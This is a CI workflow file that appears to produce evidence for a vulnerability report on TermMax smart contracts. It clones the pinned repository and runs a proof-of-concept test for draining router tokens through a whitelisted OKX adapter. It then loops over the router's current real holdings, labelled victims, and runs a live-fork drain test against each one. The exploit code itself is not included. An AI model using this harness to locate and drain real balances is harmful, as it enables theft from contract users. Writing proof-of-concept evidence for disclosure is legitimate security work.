name: termmax-tm-o1-retry

on:
  pull_request:
    types: [opened, synchronize, reopened]
    paths:
      - 'termmax-live-gate-trigger.txt'

permissions:
  contents: read

jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable

      - name: State gate without historical-log dependency
        continue-on-error: true
        shell: bash
        run: |
          set +e
          mkdir -p evidence/live evidence/tests
          forge --version > evidence/FOUNDRY_VERSION.txt
          SCAN_START_BLOCK=99999999 OUT_DIR=evidence/live python3 scripts/termmax_live_gate_v2.py > evidence/live/EXECUTION.log 2>&1
          echo "$?" > evidence/live/EXIT_STATUS.txt
          cat evidence/live/EXECUTION.log
          exit 0

      - name: Install exact repository dependencies and execute source PoC
        continue-on-error: true
        shell: bash
        run: |
          set +e
          git clone https://github.com/term-structure/termmax-contract-v2.git termmax > evidence/tests/CLONE.log 2>&1
          cd termmax || exit 0
          git checkout e314f3f849577dfecd4614f148c4df81fdf8c72d >> ../evidence/tests/CLONE.log 2>&1
          git rev-parse HEAD > ../evidence/tests/TERMMAX_GIT_HEAD.txt
          forge soldeer update > ../evidence/tests/SOLDEER.log 2>&1
          echo "$?" > ../evidence/tests/SOLDEER_EXIT_STATUS.txt
          cp ../poc/TERMMAX_TM_O1_CI_POC.t.sol test/v2/TermMaxOkxArbitraryTargetDrainPoC.t.sol
          git diff --no-index /dev/null test/v2/TermMaxOkxArbitraryTargetDrainPoC.t.sol > ../evidence/tests/POC_TEST_ONLY.diff 2>&1
          forge test --use 0.8.30 --optimizer-runs 1 --via-ir \
            --match-contract TermMaxOkxArbitraryTargetDrainPoC \
            --match-test test_PoC_WhitelistedOkxAdapterDrainsUnrelatedRouterTokenViaForgedReturn \
            -vvvv > ../evidence/tests/TM_O1_UNIT.log 2>&1
          echo "$?" > ../evidence/tests/TM_O1_UNIT_EXIT_STATUS.txt
          cat ../evidence/tests/TM_O1_UNIT.log
          exit 0

      - name: Execute live-fork drain when a current common-token balance exists
        continue-on-error: true
        shell: bash
        run: |
          set +e
          if [ ! -f evidence/live/SUMMARY.json ] || [ ! -d termmax ]; then
            echo missing-prerequisite > evidence/tests/FORK_SKIPPED.txt
            exit 0
          fi
          python3 - <<'PY' > evidence/tests/VICTIMS.tsv
          import json
          s=json.load(open('evidence/live/SUMMARY.json'))
          for h in s.get('positiveHoldings',[]): print(h['token'],h.get('symbol') or '',h['balance'],h.get('decimals'),sep='\t')
          PY
          endpoint=$(python3 -c "import json;print(json.load(open('evidence/live/SUMMARY.json'))['endpoint'])")
          block=$(python3 -c "import json;print(json.load(open('evidence/live/SUMMARY.json'))['snapshotBlock'])")
          wl=$(python3 -c "import json;print(str(json.load(open('evidence/live/SUMMARY.json')).get('adapterWhitelisted')).lower())")
          if [ "$wl" != true ] || [ ! -s evidence/tests/VICTIMS.tsv ]; then
            echo "whitelist=$wl or no positive common-token holdings" > evidence/tests/FORK_SKIPPED.txt
            exit 0
          fi
          cd termmax
          success=0
          while IFS=$'\t' read -r token symbol balance decimals; do
            safe=$(echo "$token" | tr '[:upper:]' '[:lower:]' | tr -cd '0-9a-fx')
            MAINNET_RPC_URL="$endpoint" FORK_BLOCK="$block" VICTIM_TOKEN="$token" \
              forge test --use 0.8.30 --optimizer-runs 1 --via-ir \
              --match-contract TermMaxOkxLiveForkDrainPoC \
              --match-test test_PoC_LiveForkDrainCurrentRouterBalance \
              -vvvv > "../evidence/tests/FORK_${safe}.log" 2>&1
            status=$?
            printf '%s\t%s\t%s\t%s\n' "$token" "$symbol" "$balance" "$status" >> ../evidence/tests/FORK_RESULTS.tsv
            if [ "$status" -eq 0 ]; then
              echo "$token" > ../evidence/tests/FORK_SUCCESS_TOKEN.txt
              cp "../evidence/tests/FORK_${safe}.log" ../evidence/tests/FORK_SUCCESS.log
              success=1
              break
            fi
          done < ../evidence/tests/VICTIMS.tsv
          echo "$success" > ../evidence/tests/FORK_SUCCESS_STATUS.txt
          exit 0

      - name: Manifest
        if: always()
        shell: bash
        run: |
          set +e
          find evidence -type f -print0 | sort -z | xargs -0 sha256sum > evidence/SHA256SUMS.txt
          find evidence -type f -printf '%p\t%s bytes\n' | sort > evidence/FILE_LIST.txt

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: termmax-tm-o1-retry-evidence
          path: evidence/
          retention-days: 7
